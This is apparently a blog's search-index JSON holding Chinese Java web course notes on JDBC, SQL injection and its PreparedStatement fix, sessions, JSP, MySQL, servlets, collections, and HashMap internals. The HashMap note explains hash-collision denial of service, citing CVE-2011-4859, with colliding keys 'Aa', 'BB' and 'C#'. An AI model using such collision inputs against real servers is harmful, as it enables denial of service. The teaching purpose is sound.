stat.executeQuery(sql); //5.处理结果集 while(rs.next()) { Integer sid = rs.getInt(\"sid\"); String name = rs.getString(\"name\"); Integer age = rs.getI","date":"2021-07-28","objectID":"/posts/jdbc-01/:0:5","tags":[],"title":"JDBC-01","uri":"/posts/jdbc-01/"},{"categories":["大三下实训笔记"],"content":"五、SQL注入攻击（理解） sql注入在以前，网站安全级别较低时， 能够通过错误的用户名和密码完成登录、 甚至删除数据 、拖走数据库！ 什么是sql注入？ 注入有什么后果？ 如何防范？ 1.sql注入攻击的演示 在登录界面，输入一个错误的用户名或密码，也可以登录成功 2.sql注入攻击的原理 按照正常道理来说，我们在密码处输入的所有内容，都应该认为是密码的组成 但是现在Statement对象在执行sql语句时，将一部分内容当做查询条件来执行了 3.PreparedStatement的介绍（预编译对象） 预编译sql语句的执行者对象。在执行sql语句之前，将sql语句进行提前编译。明确sql语句的格式后，就不会改变了。剩余的内容都会认为是参数！参数使用?作为占位符 为参数赋值的方法：setXxx(参数1,参数2); 参数1：?的位置编号(编号从1开始) 参数2：?的实际参数 执行sql语句的方法 执行insert、update、delete语句：int executeUpdate(); 执行select语句：ResultSet executeQuery(); 4.PreparedStatement的使用 /* 使用PreparedStatement的登录方法，解决注入攻击 */ @Override public User findByLoginNameAndPassword(String loginName, String password) { //定义必要信息 Connection conn = null; PreparedStatement pstm = null; ResultSet rs = null; User user = null; try { //1.获取连接 conn = JDBCUtils.getConnection(); //2.创建操作SQL对象 String sql = \"SELECT * FROM user WHERE loginname=? AND password=?\"; pstm = conn.prepareStatement(sql); //3.设置参数 pstm.setString(1,loginName); pstm.setString(2,password); System.out.println(sql); //4.执行sql语句，获取结果集 rs = pstm.executeQuery(); //5.获取结果集 if (rs.next()) { //6.封装 user = new User(); user.setUid(rs.getString(\"uid\")); user.setUcode(rs.getString(\"ucode\")); user.setUsername(rs.getString(\"username\")); user.setPassword(rs.getString(\"password\")); user.setGender(rs.getString(\"gender\")); user.setDutydate(rs.getDate(\"dutydate\")); user.setBirthday(rs.getDate(\"birthday\")); user.setLoginname(rs.getString(\"loginname\")); } //7.返回 return user; }catch (Exception e){ throw new RuntimeException(e); }finally { JDBCUtils.close(conn,pstm,rs); } } 5.使用PreparedStatement优化student表的CRUD（作业） public class StudentDaoImpl implements StudentDao { @Override public ArrayList\u003cStudent\u003e findAll() { //定义必要信息 Connection conn = null; PreparedStatement pstm = null; ResultSet rs = null; ArrayList\u003cStudent\u003e students = null; try { //1.获取连接 conn = JDBCUtils.getConnection(); //2.获取操作对象 pstm = conn.prepareStatement(\"select * from student\"); //3.执行sql语句，获取结果集 rs = pstm.executeQuery(); //4.遍历结果集 students = new ArrayList\u003cStu","date":"2021-07-28","objectID":"/posts/jdbc-01/:0:6","tags":[],"title":"JDBC-01","uri":"/posts/jdbc-01/"},{"categories":["大三下实训笔记"],"content":"六、综合案例-批量新增加事务管理 1.service层 接口 /* 批量添加 */ void batchAdd(List\u003cUser\u003e users); 实现类 /* 事务要控制在此处 */ @Override public void batchAdd(List\u003cUser\u003e users) { //获取数据库连接 Connection connection = JDBCUtils.getConnection(); try { //开启事务 connection.setAutoCommit(false); for (User user : users) { //1.创建ID,并把UUID中的-替换 String uid = UUID.randomUUID().toString().replace(\"-\", \"\").toUpperCase(); //2.给user的uid赋值 user.setUid(uid); //3.生成员工编号 user.setUcode(uid); //模拟异常 //int n = 1 / 0; //4.保存 userDao.save(connection,user); } //提交事务 connection.commit(); }catch (Exception e){ try { //回滚事务 connection.rollback(); }catch (Exception ex){ ex.printStackTrace(); } e.printStackTrace(); }finally { JDBCUtils.close(connection,null,null); } } 2.dao层 接口 /** 支持事务的添加 */ void save(Connection connection,User user); 实现类 /* 支持事务的添加 */ @Override public void save(Connection connection, User user) { //定义必要信息 PreparedStatement pstm = null; try { //1.获取连接 connection = JDBCUtils.getConnection(); //2.获取操作对象 pstm = connection.prepareStatement(\"insert into user(uid,ucode,loginname,password,username,gender,birthday,dutydate)values(?,?,?,?,?,?,?,?)\"); //3.设置参数 pstm.setString(1,user.getUid()); pstm.setString(2,user.getUcode()); pstm.setString(3,user.getLoginname()); pstm.setString(4,user.getPassword()); pstm.setString(5,user.getUsername()); pstm.setString(6,user.getGender()); pstm.setDate(7,new Date(user.getBirthday().getTime())); pstm.setDate(8,new Date(user.getDutydate().getTime())); //4.执行sql语句，获取结果集 pstm.executeUpdate(); }catch (Exception e){ throw new RuntimeException(e); }finally { JDBCUtils.close(null,pstm,null); } } 小结：JDBC事务控制：（动手） 测试： 张三给李四转账： 测试无异常时，转账是否成功； 如果有异常时，转账金额是否一个扣钱、一个没收到？ @Test public void test() throws Exception{ //1.导入jar包 //2.注册驱动 Class.forName(\"com.mysql.jdbc.Driver\"); //3.获取连接 Connection con = DriverManager.getConnection(\"jdbc:mysql://localhost:3306/db04?useUnicode=true\u0026characterEncoding=utf-8\u0026serverTimezone=GMT\",\"root\",\"root\"); PreparedStatement pstat = null; PreparedStatement pstat2 = null; try { //","date":"2021-07-28","objectID":"/posts/jdbc-01/:0:7","tags":[],"title":"JDBC-01","uri":"/posts/jdbc-01/"},{"categories":["大三下实训笔记"],"content":"会话技术session\u0026jsp\u0026mysql-随堂笔记","date":"2021-07-28","objectID":"/posts/session-jsp-mysql/","tags":[],"title":"session \u0026 jsp \u0026 mysql","uri":"/posts/session-jsp-mysql/"},{"categories":["大三下实训笔记"],"content":"【会话技术session\u0026jsp\u0026mysql-随堂笔记】 〇.今日重点： session： 服务器端会话技术 session是什么 session如何使用 session的作用范围 jsp: 动态页面 了解即可 mysql:数据库 数据库的安装 数据库集成到idea 数据库的crud 一.request\u0026response综合案例关注点： 客户端添加数据到服务器： 服务器响应数据到客户端（浏览器）： 二.session：服务器端会话技术 ​ 1.session是什么: ==本质也是采用客户端会话管理技术。 (session必须依赖于cookie )== 只不过在客户端保存的是一个特殊标识，而共享的数据保存到了服务器端的内存对象中。 （JSESSIONID) 每次请求时，会将特殊标识带到服务器端，根据这个标识来找到对应的内存空间，从而实现数据共享！ 是 Servlet 规范中四大域对象之一的会话域对象。 **作用：**可以实现数据共享 注意： 从大到小的顺序： servletContext \u003e session \u003e request 当前服务器有100个用户， 每个用户访问100次， 会分别产生多少个 servletContext 、 session 、request？ 2.session的获取：（掌握） HttpSession session = request.getSession(); 3.常用方法：（掌握） // 域对象存取值： session.setAttribute(); session.getAttribute(); session.removeAttribute(); //// 销毁session : 退出功能 session.invalidate(); // 获取的是当前session对应的 JSESSIONID --\u003e 唯一的 （每个会话的id是唯一的） session.getId(); 三.JSP（次要） 1.jsp的概念 JSP全称是Java Server Page，它和Servlet一样，也是sun公司推出的一套开发动态web资源的技术，称为JSP/Servlet规范。 JSP的本质其实就是一个Servlet。 与html的区别： 可以在页面上也后台java代码！ 注意：（虽然能写，但是我们应当尽量不写； 能在后台处理的逻辑，不要在页面处理！） 2.jsp快速入门 3.jsp的本质： jsp效率低下的原因: (所以大型项目基本不用jsp，一些小型的后台系统会使用) 效率对比： 4.jsp语法： JSP语法完整示例代码 \u003c%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %\u003e \u003chtml\u003e \u003chead\u003e \u003ctitle\u003eJSP语法\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003c!--Java代码块--\u003e \u003c% out.println(\"这是Java代码块\");%\u003e \u003chr/\u003e \u003c!--JSP表达式--\u003e \u003c%=\"这是JSP表达式\"%\u003e\u003cbr/\u003e 就相当于\u003cbr/\u003e \u003c%out.println(\"这是没有JSP表达式输出的\");%\u003e \u003chr/\u003e \u003c!--JSP声明--\u003e \u003c%! String str = \"声明语法格式\";%\u003e \u003c%=str%\u003e \u003chr/\u003e \u003c%--JSP注释--%\u003e \u003c!--HTML注释--\u003e \u003c/body\u003e \u003c/html\u003e 5.四大域对象对比：（理解域对象的名字和范围） 四.MVC模型的理解（重要） 把数据的封装、展示和业务处理，进行分工！ **Servlet：**擅长处理业务逻辑，不擅长输出显示界面。在web开发中多用于控制程序逻辑（流程）。所以我们称之为：控制器。 **JSP：**擅长显示界面，不擅长处理程序逻辑。在web开发中多用于展示动态界面。所以我们称之为：视图。 五、数据库的基本概念 1.为什么要学数据库？ 之前我们如果想将一些数据实现永久化存储，可以怎么做呢？没错。使用IO流的技术将数据保存到本地文件中 但是接下来我有这样一个需求：将下面的user.txt文件中的王五年龄修改为35 张三 23 男 李四 24 男 王五 25 女 赵六 26 女 周七 27 男 我们要如何实现呢？ 可以采用字符缓冲流，将每一行数据读取出来，封装为User对象。将多个User对象保存到集合中 然后遍历集合，将王五对象的年龄修改为35,再重新将集合中的对象信息写回到文件中 这一套操作太麻烦了，而现在我们有一种更加方便的方式来完成这个需求了，这种方式就是数据库！ 2.什么是数据库？ 用于存储和管理数据的仓库 英文单词为：DataBase，简称DB （工种： DBA 数据库管理员） 3.数据库的好处？ 可以持久化存储数据 方便存储和","date":"2021-07-28","objectID":"/posts/session-jsp-mysql/:0:0","tags":[],"title":"session \u0026 jsp \u0026 mysql","uri":"/posts/session-jsp-mysql/"},{"categories":["大三下实训笔记"],"content":"二、MySQL数据库的介绍和安装 1.MySQL数据库介绍 小型的数据库 开源免费(6版本之前免费) 所属于Oracle公司 2.MySQL数据库安装 —查看安装资料 1.在windows安装mysql服务器； 2.在windows安装mysql连接工具；（图形化界面） ","date":"2021-07-28","objectID":"/posts/session-jsp-mysql/:0:1","tags":[],"title":"session \u0026 jsp \u0026 mysql","uri":"/posts/session-jsp-mysql/"},{"categories":["大三下实训笔记"],"content":"三、SQL语句 1.数据库、数据表、数据的关系介绍 数据库 用于存储和管理数据的仓库 一个库中可以包含多个数据表 数据表 数据库最重要的组成部分之一 它由纵向的列和横向的行组成(类似excel表格) 可以指定列名、数据类型、约束等 一个表中可以存储多条数据 数据 想要永久化存储的数据 2.SQL介绍 什么是SQL Structured Query Language：结构化查询语言 其实就是定义了操作所有关系型数据库的规则。每一种数据库操作的方式可能会存在一些不一样的地方，我们称为“方言”。 SQL通用语法 SQL 语句可以单行或多行书写，以分号结尾。 可使用空格和缩进来增强语句的可读性。 MySQL 数据库的 SQL 语句不区分大小写，关键字建议使用大写。 数据库的注释： 单行注释：– 注释内容 #注释内容(mysql特有) 多行注释：/* 注释内容 */ SQL分类 DDL(Data Definition Language)数据定义语言 用来定义数据库对象：数据库，表，列等。关键字：create, drop,alter 等 DML(Data Manipulation Language)数据操作语言 用来对数据库中表的数据进行增删改。关键字：insert, delete, update 等 DQL(Data Query Language)数据查询语言 用来查询数据库中表的记录(数据)。关键字：select, where 等 DCL(Data Control Language)数据控制语言(了解) 用来定义数据库的访问权限和安全级别，及创建用户。关键字：GRANT， REVOKE 等 ","date":"2021-07-28","objectID":"/posts/session-jsp-mysql/:0:2","tags":[],"title":"session \u0026 jsp \u0026 mysql","uri":"/posts/session-jsp-mysql/"},{"categories":["大三下实训笔记"],"content":"四.对库和表结构的操作（理解） 3.DDL-操作数据库 R(Retrieve)：查询 查询所有数据库 -- 查询所有数据库 SHOW DATABASES; C(Create)：创建 创建数据库 -- 标准语法 CREATE DATABASE 数据库名称; -- 创建db1数据库 CREATE DATABASE db1; -- 创建一个已存在的数据库会报错 -- 错误代码：1007 Can't create database 'db1'; database exists CREATE DATABASE db1; 创建数据库(判断，如果不存在则创建) -- 标准语法 CREATE DATABASE IF NOT EXISTS 数据库名称; -- 创建数据库db2(判断，如果不存在则创建) CREATE DATABASE IF NOT EXISTS db2; 创建数据库、并指定字符集 -- 标准语法 CREATE DATABASE 数据库名称 CHARACTER SET 字符集名称; -- 创建数据库db3、并指定字符集utf8 CREATE DATABASE db3 CHARACTER SET utf8; -- 查看db3数据库的字符集 SHOW CREATE DATABASE db3; 练习：创建db4数据库、如果不存在则创建，指定字符集为utf8 -- 创建db4数据库、如果不存在则创建，指定字符集为 utf8 CREATE DATABASE IF NOT EXISTS db4 CHARACTER SET utf8; -- 查看db4数据库的字符集 SHOW CREATE DATABASE db4; 使用数据库 -- 标准语法 USE 数据库名称； -- 使用db4数据库 USE db4; 【小结：库操作常用sql （需要记住的sql） -- 1. 创建db4数据库、如果不存在则创建，指定字符集为 utf8 -- CREATE DATABASE IF NOT EXISTS 数据库名 CHARACTER SET 字符集名; CREATE DATABASE IF NOT EXISTS db01 CHARACTER SET utf8; -- 2.展示当前数据库下所有的表： (还没建表的时候没有) show tables; -- 3. 删除数据库： DROP DATABASE 数据库名 DROP DATABASE db03; 4.DDL-操作数据表 R(Retrieve)：查询 查询数据库中所有的数据表 -- 使用mysql数据库 USE mysql; -- 查询库中所有的表 SHOW TABLES; 查询表结构 -- 标准语法 DESC 表名; -- 查询user表结构 DESC user; 查询表字符集 -- 标准语法 SHOW TABLE STATUS FROM 库名 LIKE '表名'; -- 查看mysql数据库中user表字符集 SHOW TABLE STATUS FROM mysql LIKE 'user'; C(Create)：创建 创建数据表 标准语法 CREATE TABLE 表名( 列名1 数据类型1, 列名2 数据类型2, .... 列名n 数据类型n ); -- 注意：最后一列，不需要加逗号 数据类型 1. int：整数类型 * age int 2. double:小数类型 * score double(5,2) * price double 3. date:日期，只包含年月日 yyyy-MM-dd 4. datetime:日期，包含年月日时分秒 yyyy-MM-dd HH:mm:ss 5. timestamp:时间戳类型 包含年月日时分秒 yyyy-MM-dd HH:mm:ss * 如果将来不给这个字段赋值，或赋值为null，则默认使用当前的系统时间，来自动赋值 6. varchar：字符串 * name varchar(20):姓名最大20个字符 * zhangsan 8个字符 张三 2个字符*3 创建数据表 -- 使用db3数据库 USE db3; -- 创建一个product商品表 CREATE TABLE product( id INT, -- 商品编号 NAME VARCHAR(30), -- 商品名称 price DOUBLE, -- 商品价格 stock INT, -- 商品库存 insert_time DATE -- 上架时间 ); 对库的操作： 都是database关键字； 对表结构的操作： 都是table关键字； 上面的操作都是对数据库、数据表结构操作的sql语句，不涉及数据！ 真正以后非常常用的sql是下面的对数据的crud（增删改查）！ ","date":"2021-07-28","objectID":"/posts/session-jsp-mysql/:0:3","tags":[],"title":"session \u0026 jsp \u0026 mysql","uri":"/posts/session-jsp-mysql/"},{"categories":["大三下实训笔记"],"content":"五.对数据的操作（重要） – 对数据的增删改查 5.DML-INSERT语句 新增表数据语法 新增格式1：给指定列添加数据 -- 标准语法 INSERT INTO 表名(列名1,列名2,...) VALUES (值1,值2,...); -- 向product表添加一条数据 INSERT INTO product(id,NAME,price,stock,insert_time) VALUES (1,'手机',1999,22,'2099-09-09'); -- 向product表添加指定列数据 INSERT INTO product (id,NAME,price) VALUES (2,'电脑',4999); -- 查看表中所有数据 SELECT * FROM product; 新增格式2：默认给全部列添加数据 -- 标准语法 INSERT INTO 表名 VALUES (值1,值2,值3,...); -- 默认给全部列添加数据 INSERT INTO product VALUES (3,'电视',2999,18,'2099-06-06'); -- 查看表中所有数据 SELECT * FROM product; 新增格式3：批量添加数据 -- 默认添加所有列数据 标准语法 INSERT INTO 表名 VALUES (值1,值2,值3,...),(值1,值2,值3,...),(值1,值2,值3,...); -- 批量添加数据 INSERT INTO product VALUES (4,'冰箱',999,26,'2099-08-08'),(5,'洗衣机',1999,32,'2099-05-10'); -- 查看表中所有数据 SELECT * FROM product; -- 给指定列添加数据 标准语法 INSERT INTO 表名(列名1,列名2,...) VALUES (值1,值2,...),(值1,值2,...),(值1,值2,...); -- 批量添加指定列数据 INSERT INTO product (id,NAME,price) VALUES (6,'微波炉',499),(7,'电磁炉',899); -- 查看表中所有数据 SELECT * FROM product; 注意事项 列名和值的数量以及数据类型要对应 除了数字类型，其他数据类型的数据都需要加引号(单引双引都可以，推荐单引) 6.DML-UPDATE语句 修改表数据语法 -- 标准语法 UPDATE 表名 SET 列名1 = 值1,列名2 = 值2,... [where 条件]; -- 修改手机的价格为3500 UPDATE product SET price=3500 WHERE NAME='手机'; -- 查看所有数据 SELECT * FROM product; -- 修改电视的价格为1800、库存为36 UPDATE product SET price=1800,stock=36 WHERE NAME='电视'; -- 修改电磁炉的库存为10 UPDATE product SET stock=10 WHERE id=7; 注意事项 修改语句中必须加条件 如果不加条件，则将所有数据都修改 7.DML-DELETE语句 删除表数据语法 -- 标准语法 DELETE FROM 表名 [WHERE 条件]; -- 删除product表中的微波炉信息 DELETE FROM product WHERE NAME='微波炉'; -- 删除product表中库存为10的商品信息 DELETE FROM product WHERE stock=10; -- 查看所有商品信息 SELECT * FROM product; 注意事项 删除语句中必须加条件 如果不加条件，则将所有数据删除 8.DQL-单表查询 数据准备(直接复制执行即可) -- 创建db1数据库 CREATE DATABASE db1; -- 使用db1数据库 USE db1; -- 创建数据表 CREATE TABLE product( id INT, -- 商品编号 NAME VARCHAR(20), -- 商品名称 price DOUBLE, -- 商品价格 brand VARCHAR(10), -- 商品品牌 stock INT, -- 商品库存 insert_time DATE -- 添加时间 ); -- 添加数据 INSERT INTO product VALUES (1,'华为手机',3999,'华为',23,'2088-03-10'), (2,'小米手机',2999,'小米',30,'2088-05-15'), (3,'苹果手机',5999,'苹果',18,'2088-08-20'), (4,'华","date":"2021-07-28","objectID":"/posts/session-jsp-mysql/:0:4","tags":[],"title":"session \u0026 jsp \u0026 mysql","uri":"/posts/session-jsp-mysql/"},{"categories":["大三下实训笔记"],"content":"请求响应对象","date":"2021-07-24","objectID":"/posts/request-response/","tags":[],"title":"request \u0026 response","uri":"/posts/request-response/"},{"categories":["大三下实训笔记"],"content":"【web核心-请求响应对象-随堂笔记】 ","date":"2021-07-24","objectID":"/posts/request-response/:0:0","tags":[],"title":"request \u0026 response","uri":"/posts/request-response/"},{"categories":["大三下实训笔记"],"content":"一.今日重点： 请求对象-request （请求对象的api） 请求参数的获取 请求乱码的处理 请求转发 响应对象-response (响应对象的api) 常见响应状态码 服务器数据响应到浏览器 响应乱码的处理 请求重定向 ","date":"2021-07-24","objectID":"/posts/request-response/:1:0","tags":[],"title":"request \u0026 response","uri":"/posts/request-response/"},{"categories":["大三下实训笔记"],"content":"二.前置案例： 1.请求方式与servlet的方法对应关系： 2.请求对象与响应对象的快速入门： ","date":"2021-07-24","objectID":"/posts/request-response/:2:0","tags":[],"title":"request \u0026 response","uri":"/posts/request-response/"},{"categories":["大三下实训笔记"],"content":"三.request请求对象 1.请求路径：（理解） /** * 请求对象的各种信息获取 * @author 黑马程序员 * @Company http://www.itheima.com */ public class RequestDemo1 extends HttpServlet { public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { //本机地址：服务器地址 String localAddr = request.getLocalAddr(); //本机名称：服务器名称 String localName = request.getLocalName(); //本机端口：服务器端口 int localPort = request.getLocalPort(); //来访者ip String remoteAddr = request.getRemoteAddr(); //来访者主机 String remoteHost = request.getRemoteHost(); //来访者端口 int remotePort = request.getRemotePort(); //统一资源标识符 String URI = request.getRequestURI(); //统一资源定位符 String URL = request.getRequestURL().toString(); //获取查询字符串 String queryString = request.getQueryString(); //获取Servlet映射路径 String servletPath = request.getServletPath(); //输出内容 System.out.println(\"getLocalAddr() is :\"+localAddr); System.out.println(\"getLocalName() is :\"+localName); System.out.println(\"getLocalPort() is :\"+localPort); System.out.println(\"getRemoteAddr() is :\"+remoteAddr); System.out.println(\"getRemoteHost() is :\"+remoteHost); System.out.println(\"getRemotePort() is :\"+remotePort); System.out.println(\"getRequestURI() is :\"+URI); System.out.println(\"getRequestURL() is :\"+URL); System.out.println(\"getQueryString() is :\"+queryString); System.out.println(\"getServletPath() is :\"+servletPath); } public void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { doGet(request, response); } } 小结： 2.请求参数的获取：（重要） 1）获取请求参数 getParameter()方法的示例代码 /** * 获取请求正文，一个名称对应一个值。 没有使用确认密码 * @param request * @param response * @throws ServletException * @throws IOException */ private void test1(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { //1.获取请求正文 String username = request.getParameter(\"username\"); String password = request.getParameter(\"password\"); String gender = request.getParameter(\"gender\"); System.out.println(username+\",\"+password+\",\"+gender); ","date":"2021-07-24","objectID":"/posts/request-response/:3:0","tags":[],"title":"request \u0026 response","uri":"/posts/request-response/"},{"categories":["大三下实训笔记"],"content":"四.response响应对象： 1.常见状态码：（记住） 2.响应数据到浏览器：（重要） 响应文本数据 如何使用： // 响应一句话到浏览器： response.getWriter().write(\"你好 ~~ hello ~~ 123\"); 如何避免中文乱码问题： //解决响应中文乱码 response.setContentType(\"text/html; charset=utf-8\"); 3.设置响应消息头定时刷新 /** * 设置响应消息头： * 通过定时刷新演示添加消息头 * @author 黑马程序员 * @Company http://www.itheima.com * */ public class ResponseDemo5 extends HttpServlet { public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { String str = \"用户名和密码不匹配，2秒后转向登录页面...\"; response.setContentType(\"text/html;charset=UTF-8\"); PrintWriter out = response.getWriter(); out.write(str); //定时刷新，其实就是设置一个响应消息头 response.setHeader(\"Refresh\", \"2;URL=/login.html\");//Refresh设置的时间单位是秒，如果刷新到其他地址，需要在时间后面拼接上地址 } public void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { doGet(request, response); } } 小结： 定时刷新，后期可以结合js一起完成 * resp.setContentType: 告诉客户端浏览器，以何种方式解析内容； * * resp.setHeader: 设置响应头，告诉浏览器应该做什么 * * resp.setHeader(\"Refresh\",\"10;URL=/index.html\"); //告诉浏览器，在10秒后，自动请求URL指定的资源 4.重定向：redirect（重要） 思考： ​ 重定向后， 请求次数有几次？ ​ 重定向后，携带的参数是否可以共享？ ​ 重定向后，浏览器的地址栏是否有变化？ 浏览器端-》servlet1-》servlet2 如何使用： // 重定向 到项目内部 testRedirect02 response.sendRedirect(\"testRedirect02\"); // 演示跨服务器: 重定向到百度 response.sendRedirect(\"https://www.baidu.com/\"); 重定向执行顺序： 重定向和转发的区别：（面试常问） 请求次数 参数是否共享 地址栏是否变化 是否可以跨服务器 5.响应和消息头组合应用-文件下载 首先，在工程的web目录下新建一个目录uploads，并且拷贝一张图片到目录中，如下图所示： 文件下载的Servlet代码如下： /** * 文件下载 */ public class ResponseDemo8 extends HttpServlet { public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { /* * 文件下载的思路： * 1.获取文件路径 * 2.把文件读到字节输入流中 * 3.告知浏览器，以下载的方式打开（告知浏览器下载文件的MIME类型） * 4.使用响应对象的字节输出流输出到浏览器上 */ //1.获取文件路径（绝对路径） ServletContext context = this.getServletContext(); String filePath = context.getRealPath(\"/uploads/6.jpg\");//通过文件的虚拟路径，获取文件的绝对路径 //2.通过文件路径构建一个字节输入流 InputStream in = new FileInputStream(filePath); //3.设置响应消息头 response.setHeader(\"Content-Type\", \"application/octet","date":"2021-07-24","objectID":"/posts/request-response/:4:0","tags":[],"title":"request \u0026 response","uri":"/posts/request-response/"},{"categories":["java面试"],"content":"享学hashmap","date":"2021-07-21","objectID":"/posts/hashmap/","tags":["HashMap"],"title":"HashMap","uri":"/posts/hashmap/"},{"categories":["java面试"],"content":" 数据结构：数组+链表+红黑树（JDK8） 算法： Hash算法 数组定位 Hash冲突 扩容 多线程安全 1、JDK8为什么加入了红黑树？ 单纯为了效率？ HashMap导致Dos? 线程安全的场景下 CVE-2011-4859 Tomcat邮件组的讨论 max 黑客构造W+的Hash值相等的键key来构造请求参数，那么就造成了Hash冲突，会构成一个W+的链表，而链表的查询效率是十分低的，占用大量的CPU时间，无法响应用户请求。 Map\u003cString,String\u003e hashMap=new HashMap\u003cString, String\u003e(); List\u003cString\u003e list= Arrays.asList(\"Aa\",\"BB\",\"C#\"); for(String string:list){ System.out.println(string.hashCode()); hashMap.put(string,string); } Iterator\u003cString\u003e iterator = hashMap.keySet().iterator(); while (iterator.hasNext()) { System.out.println(iterator.next()); } 2112 2112 2112 Aa BB C# 为什么是红黑树？ 红黑树、二叉树、二叉排序树、平衡二叉树，而平衡二叉树的查询效率最高； 构建平衡二叉树十分消耗性能，涉及二叉树旋转平衡，所以采用折中的方案：红黑树中只有有一个原则：max\u003c=2*min; 2、HashMap出现Dos，表现形式：CPU 100%，怎么解决？ JVM的性能排查，jstack,top,jmap,arthas《JVM性能调优》 3、Hash Map中的算法 ","date":"2021-07-21","objectID":"/posts/hashmap/:0:0","tags":["HashMap"],"title":"HashMap","uri":"/posts/hashmap/"},{"categories":["java面试"],"content":"Hash算法的流程 static final int hash(Object key) { int h; return key == null ? 0 : (h = key.hashCode()) ^ h \u003e\u003e\u003e 16; } public native int hashCode(); ","date":"2021-07-21","objectID":"/posts/hashmap/:1:0","tags":["HashMap"],"title":"HashMap","uri":"/posts/hashmap/"},{"categories":["大三下实训笔记"],"content":"Collection-List","date":"2021-07-21","objectID":"/posts/collection-01/","tags":[],"title":"Collection -01","uri":"/posts/collection-01/"},{"categories":["大三下实训笔记"],"content":"1.Collection集合 ","date":"2021-07-21","objectID":"/posts/collection-01/:1:0","tags":[],"title":"Collection -01","uri":"/posts/collection-01/"},{"categories":["大三下实训笔记"],"content":"1.1数组和集合的区别【理解】 相同点 都是容器,可以存储多个数据 不同点 数组的长度是不可变的,集合的长度是可变的 数组可以存基本数据类型和引用数据类型 集合只能存引用数据类型,如果要存基本数据类型,需要存对应的包装类 ","date":"2021-07-21","objectID":"/posts/collection-01/:1:1","tags":[],"title":"Collection -01","uri":"/posts/collection-01/"},{"categories":["大三下实训笔记"],"content":"1.2集合类体系结构【理解】 ","date":"2021-07-21","objectID":"/posts/collection-01/:1:2","tags":[],"title":"Collection -01","uri":"/posts/collection-01/"},{"categories":["大三下实训笔记"],"content":"1.3Collection 集合概述和使用【应用】 Collection集合概述 是单例集合的顶层接口,它表示一组对象,这些对象也称为Collection的元素 JDK 不提供此接口的任何直接实现.它提供更具体的子接口(如Set和List)实现 创建Collection集合的对象 多态的方式 具体的实现类ArrayList Collection集合常用方法 方法名 说明 boolean add(E e) 添加元素 boolean remove(Object o) 从集合中移除指定的元素 boolean removeIf(Object o) 根据条件进行移除 void clear() 清空集合中的元素 boolean contains(Object o) 判断集合中是否存在指定的元素 boolean isEmpty() 判断集合是否为空 int size() 集合的长度，也就是集合中元素的个数 ","date":"2021-07-21","objectID":"/posts/collection-01/:1:3","tags":[],"title":"Collection -01","uri":"/posts/collection-01/"},{"categories":["大三下实训笔记"],"content":"1.4Collection集合的遍历【应用】 迭代器介绍 迭代器,集合的专用遍历方式 Iterator iterator(): 返回此集合中元素的迭代器,通过集合对象的iterator()方法得到 Iterator中的常用方法 boolean hasNext(): 判断当前位置是否有元素可以被取出 E next(): 获取当前位置的元素,将迭代器对象移向下一个索引位置 Collection集合的遍历 public class IteratorDemo1 { public static void main(String[] args) { //创建集合对象 Collection\u003cString\u003e c = new ArrayList\u003c\u003e(); //添加元素 c.add(\"hello\"); c.add(\"world\"); c.add(\"java\"); c.add(\"javaee\"); //Iterator\u003cE\u003e iterator()：返回此集合中元素的迭代器，通过集合的iterator()方法得到 Iterator\u003cString\u003e it = c.iterator(); //用while循环改进元素的判断和获取 while (it.hasNext()) { String s = it.next(); System.out.println(s); } } } 迭代器中删除的方法 void remove(): 删除迭代器对象当前指向的元素 public class IteratorDemo2 { public static void main(String[] args) { ArrayList\u003cString\u003e list = new ArrayList\u003c\u003e(); list.add(\"a\"); list.add(\"b\"); list.add(\"b\"); list.add(\"c\"); list.add(\"d\"); Iterator\u003cString\u003e it = list.iterator(); while(it.hasNext()){ String s = it.next(); if(\"b\".equals(s)){ //指向谁,那么此时就删除谁. it.remove(); } } System.out.println(list); } } ","date":"2021-07-21","objectID":"/posts/collection-01/:1:4","tags":[],"title":"Collection -01","uri":"/posts/collection-01/"},{"categories":["大三下实训笔记"],"content":"1.5增强for循环【应用】 介绍 它是JDK5之后出现的,其内部原理是一个Iterator迭代器 实现Iterable接口的类才可以使用迭代器和增强for 简化数组和Collection集合的遍历 格式 for(集合/数组中元素的数据类型 变量名 : 集合/数组名) { // 已经将当前遍历到的元素封装到变量中了,直接使用变量即可 } 代码 public class MyCollectonDemo1 { public static void main(String[] args) { ArrayList\u003cString\u003e list = new ArrayList\u003c\u003e(); list.add(\"a\"); list.add(\"b\"); list.add(\"c\"); list.add(\"d\"); list.add(\"e\"); list.add(\"f\"); //1,数据类型一定是集合或者数组中元素的类型 //2,str仅仅是一个变量名而已,在循环的过程中,依次表示集合或者数组中的每一个元素 //3,list就是要遍历的集合或者数组 for(String str : list){ System.out.println(str); } } } ","date":"2021-07-21","objectID":"/posts/collection-01/:1:5","tags":[],"title":"Collection -01","uri":"/posts/collection-01/"},{"categories":["大三下实训笔记"],"content":"2.List集合 ","date":"2021-07-21","objectID":"/posts/collection-01/:2:0","tags":[],"title":"Collection -01","uri":"/posts/collection-01/"},{"categories":["大三下实训笔记"],"content":"2.1List集合的概述和特点【记忆】 List集合的概述 有序集合,这里的有序指的是存取顺序 用户可以精确控制列表中每个元素的插入位置,用户可以通过整数索引访问元素,并搜索列表中的元素 与Set集合不同,列表通常允许重复的元素 List集合的特点 存取有序 可以重复 有索引 ","date":"2021-07-21","objectID":"/posts/collection-01/:2:1","tags":[],"title":"Collection -01","uri":"/posts/collection-01/"},{"categories":["大三下实训笔记"],"content":"2.2List集合的特有方法【应用】 方法介绍 方法名 描述 void add(int index,E element) 在此集合中的指定位置插入指定的元素 E remove(int index) 删除指定索引处的元素，返回被删除的元素 E set(int index,E element) 修改指定索引处的元素，返回被修改的元素 E get(int index) 返回指定索引处的元素 示例代码 public class MyListDemo { public static void main(String[] args) { List\u003cString\u003e list = new ArrayList\u003c\u003e(); list.add(\"aaa\"); list.add(\"bbb\"); list.add(\"ccc\"); //method1(list); //method2(list); //method3(list); //method4(list); } private static void method4(List\u003cString\u003e list) { // E get(int index) 返回指定索引处的元素 String s = list.get(0); System.out.println(s); } private static void method3(List\u003cString\u003e list) { // E set(int index,E element) 